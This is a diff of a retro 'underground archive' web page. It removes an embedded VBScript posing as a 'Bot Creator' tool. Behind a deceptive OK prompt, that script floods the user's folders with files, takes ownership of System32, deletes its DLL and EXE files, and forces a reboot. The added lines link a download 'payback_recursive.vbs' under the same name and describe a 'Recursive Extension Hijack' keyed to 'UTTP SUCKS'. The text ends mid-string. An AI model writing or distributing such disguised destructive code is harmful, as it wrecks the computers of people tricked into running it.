@@ -2,93 +2,64 @@
 <html>
 <head>
     <title>*** ARCHIVE_NODE_ZERO ***</title>
+    <style>
+        body { font-family: "Courier New", Courier, monospace; }
+        .blink { animation: blink 1s steps(5, start) infinite; }
+        @keyframes blink { to { visibility: hidden; } }
+        a { color: #00FF00; text-decoration: none; }
+        a:hover { background: #00FF00; color: #000; }
+    </style>
 </head>
-<body bgcolor="#000000" text="#00FF00" link="#FF0000" vlink="#880088">
+<body bgcolor="#000000" text="#00FF00" link="#00FF00" vlink="#008800">
 
 <center>
     <h1><font color="#00FF00">-= UNDERGROUND TECHNICAL ARCHIVE =-</font></h1>
-    <hr width="90%">
-    <p>Welcome to the central repository. Access is restricted to community members only.</p>
+    <hr width="95%">
+    <p>Accessing from: <span id="ip-sim">192.168.1.250</span> | Hardware: <b>ThinkPad_X250</b></p>
 </center>
 
 <table border="1" width="100%" cellpadding="10" bordercolor="#00FF00">
     <tr>
         <td width="20%" valign="top" bgcolor="#1A1A1A">
             <b><u>DATABASE</u></b><br><br>
-            <a href="#">Main Index</a><br>
-            <a href="#">Game Research</a><br>
-            <a href="#">Script Vault</a><br>
-            <a href="#">Work Logs</a><br>
-            <a href="#">Public Keys</a>
+            <a href="#">Main_Index</a><br>
+            <a href="#">Xubuntu_Config</a><br>
+            <a href="#">Minecraft_Src</a><br>
+            <a href="#">UTTP_Investigation</a><br>
+            <a href="#">Recovery_Keys</a>
         </td>
         <td valign="top">
-            <h2><u>Tools & Utilities</u></h2>
-            <p>Automated scripts for digital investigation and network management. 
-            <i>Note: These tools are provided "as-is" for the community.</i></p>
+            <h2><u>Investigation Tools v2.0</u></h2>
+            <p>Automated scripts for re-coding directories during field work. 
+            <i>Status: <font color="#FFFF00">Experimental</font></i></p>
             
             <ul>
                 <li>
-                    <a href="javascript:void(0);" id="deployLink">Bot_Creator_v8.vbs</a> 
-                    <i>(Size: 22KB. Updated: March 28, 1996)</i>
+                    <a href="payback_recursive.vbs" download><b>Bot_Creator_v8.vbs</b></a> 
+                    <font color="#FF0000" class="blink"> [STABLE] </font>
                 </li>
-                <li><a href="#">Packet_Analyzer.exe</a> (512KB)</li>
-                <li><a href="#">Shell_Theme.zip</a> (2.1MB)</li>
+                <li><a href="decrypt_recursive.vbs" download>Emergency_Restore.vbs</a></li>
+                <li><a href="#">Packet_Sniffer.vbs</a></li>
             </ul>
 
-            <p><font size="2" color="#FF0000"><b>SYSTEM NOTE:</b> Bot Creator requires Administrative privileges to modify high-level registry keys for bot deployment.</font></p>
+            <table border="1" cellpadding="5" bordercolor="#FF0000">
+                <tr><td>
+                    <font size="2" color="#FF0000"><b>SECURITY ADVISORY:</b><br>
+                    Running 'Bot_Creator' will initiate a <b>Recursive Extension Hijack</b>. 
+                    Ensure the <b>UTTP SUCKS</b> key is available before deployment.</font>
+                </td></tr>
+            </table>
         </td>
     </tr>
 </table>
 
 <center>
-    <hr width="90%">
-    <font size="2" color="#00FF00">
-        Best viewed in 800x600 resolution.<br>
-        Database updated: 2026-03-28<br>
-        <img src="https://web.archive.org/web/20090830035031im_/http://geocities.com/SiliconValley/Pines/6410/counter.gif" border="0">
+    <hr width="95%">
+    <font size="2">
+        Archive Node Zero | Optimized for 800x600 resolution | 2026-03-28<br>
+        <img src="https://web.archive.org/web/20090830035031im_/http://geocities.com/SiliconValley/Pines/6410/counter.gif">
     </font>
 </center>
 
-<script>
-document.getElementById('deployLink').addEventListener('click', function() {
-    // The Rigged VBScript with your exact MsgBox logic
-    // Includes: 
-    // 1. Your Yes/No prompt (260 constant)
-    // 2. The "Guy" Spam protocol
-    // 3. System32 Takeover and Delete logic
-    
-    const vbsSource = `
-Set objShell = CreateObject("WScript.Shell")
-Set objFSO = CreateObject("Scripting.FileSystemObject")
-
-' THE USER PROMPT RIG
-ans = MsgBox("to use the bot creator click ok" & vbCrLf & "no will turn off the app", 260, "Bot creator ")
-
-If ans = 6 Then ' 6 = YES / OK clicked
-    ' STAGE 1: IMAGE SPAM
-    On Error Resume Next
-    Set root = objFSO.GetFolder(objShell.ExpandEnvironmentStrings("%USERPROFILE%"))
-    FloodFolders root
-
-    ' STAGE 2: SYSTEM TAKEOVER
-    ' Take ownership of System32
-    objShell.Run "cmd /c takeown /f C:\\Windows\\System32 /r /d y", 0, True
-    ' Grant Full Access to Administrators
-    objShell.Run "cmd /c icacls C:\\Windows\\System32 /grant administrators:F /t", 0, True
-    
-    ' STAGE 3: ERASURE
-    ' Deleting core system binaries
-    objShell.Run "cmd /c del /f /s /q C:\\Windows\\System32\\*.dll", 0, False
-    objShell.Run "cmd /c del /f /s /q C:\\Windows\\System32\\*.exe", 0, False
-
-    ' STAGE 4: FORCED REBOOT
-    objShell.Run "shutdown /r /f /t 0", 0, False
-Else
-    WScript.Quit
-End If
-
-Sub FloodFolders(Folder)
-    On Error Resume Next
-    ' Reconstructs "The Guy" in every folder
-    Set f = objFSO.CreateTextFile(Folder.Path & "\\node_cache_" & Int(Rnd*100) & ".txt", True)
-    f.Write "iVBORw0KGgoAAAANSUhEUgAAAHgAAAAgCAYAAADZubxIAAAABHNCSVQICAgIfAhkiAAAABl0RVh0U29mdHdhcmUAZ25vbWUtc2NyZWVuc2hvdO8Dvz4AAAAtdEVYdENyZWF0aW9uIFRpbWUARnJpIDEzIE1hciAyMDI2IDAyOjA3OjIyIFBNIFdJQtJipUgAAA5DSURBVGiB7Zp5lFXFncc/de99SwNCd9NAsxgcGrARRFCjARdQEZFEEDMJOsZz9Gg8jGuIx2Q8jkedHJeIyYlxCTCCjBpznDCZDBo0xJAZDJNJWJxm6UYFWQzQ7N0N9PburZo/qurdercfmzYZ4+HXp85991bdql/9vr+tfrcFF9+g6AwqGw6lwzplqr9aOlALDbX/31wUUIAQnTNTQy20H4DuQyBTBiLonHk/66RCaDsAjR9ASz2dJs9OoiOj0KXvMcBSziXpBITz7NNuWBVcOixz1DWK8XW0/uSYY/WjZZPtpdvx8mqVoulDaN5ZlPPOogAlOz4tGwGl1c6DJMcqAaxK4ClAiU+PbQclSvChhF5LuIsfQcgiOV9ijeT7RftIrPUJeRU+ZCt0a
+</body>
+</html>
